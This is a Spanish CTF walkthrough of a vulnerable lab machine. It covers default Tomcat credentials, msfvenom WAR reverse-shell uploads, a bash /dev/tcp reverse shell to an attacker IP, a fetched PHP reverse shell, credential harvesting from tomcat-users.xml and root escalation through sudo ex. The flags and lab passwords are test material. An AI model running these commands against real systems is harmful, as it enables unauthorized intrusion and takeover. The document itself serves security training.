
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.18 -oN escaneo
msfvenom -p java/shell_reverse_tcp LHOST=10.0.2.4 LPORT=443 -f war -o pwned.war
msfvenom -p java/jsp_shell_reverse_tcp  LHOST=10.0.2.4 LPORT=443 -f war -o pwned2.war
nc -nlvp 443
nc -nlvp 4444
bash -c "sh -i >& /dev/tcp/10.0.2.4/4444 0>&1"
cat conf/tomcat-users-xml
```
Primero de todo realizamos un arp-scan para encontrar la IP y una vez tengamos su IP realizamos un nmap y vemos que están abiertos los puertos 22, 80 y 8080![[Pasted image 20240305191453.png]]
Accedemos a la web del puerto 80 y no encontramos nada interesante así que buscamos al puerto 8080 donde hay un servidor apache Tomcat que nos sale el siguiente panel por el cual sabemos que el tomcat no esta configurado
![[Pasted image 20240305191634.png]]
Clicamos en el manager webapp y nos pide un usuario y contraseña así que vamos a hacktricks a buscar la contraseña por defecto de un servidor tomcat![[Pasted image 20240305191741.png]]
Si le damos al cancel este nos dará las credenciales por defecto del servidor![[Pasted image 20240305191959.png]]
Con tomcat:s3cret logramos entrar al siguiente panel![[Pasted image 20240305192110.png]]
Y encontramos un lugar donde subir archivos para ponerle un exploit con msfvenom ![[Pasted image 20240305192211.png]]
Ahora creamos las dos opciones de payloads por si acaso una no funciona y lo subimos a la máquina![[Pasted image 20240305192555.png]]
Ahora ejecutamos el primer archivo que nos da error pero al ejecutar el segundo obtenemos una reverse shell
![[Pasted image 20240305193426.png]]
Entonces enviamos la conexion por el puerto 4444 y realizamos el tratamiento de la TTY![[Pasted image 20240305193539.png]]
Ahora vamos investigando el sistema y vemos que existen los usuarios sa y toor![[Pasted image 20240305193646.png]]
Finalmente en el directorio conf encontramos el archivo tomcat-users.xml con un usuario y contraseña sa:salala!!
![[Pasted image 20240305194333.png]]
 Y nos conectamos por ssh con el usuario sa miramos sus privilegios y vemos que no es root![[Pasted image 20240305194724.png]]
```shell
cd /var/www/html
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
Ahora intentaremos ser el usuario toor para ello nos descargamos una reverse shell en el directorio html donde corre el apache debian y lo ejecutamos desde el buscador y vemos que somos el usuario toor![[Pasted image 20240305195955.png]]
```bash
sudo ex
!/bin/sh
cat /root/root.txt
cat /home/toor/user.txt
```
Ahora hacemos un sudo -l y vemos que hay un binario que podemos explotar así que buscamos el binario en gtfobins y ejecutamos el exploit para ser usuario root
![[Pasted image 20240305200155.png]]
Ahora buscamos la flag de root y la de user![[Pasted image 20240305200716.png]]![[Pasted image 20240305200742.png]]
Flag de user: d9bad39df709796d0eccb92a55f85e73
Flag de root: 0cb08f37a8e40c3e09a96e9e43b51750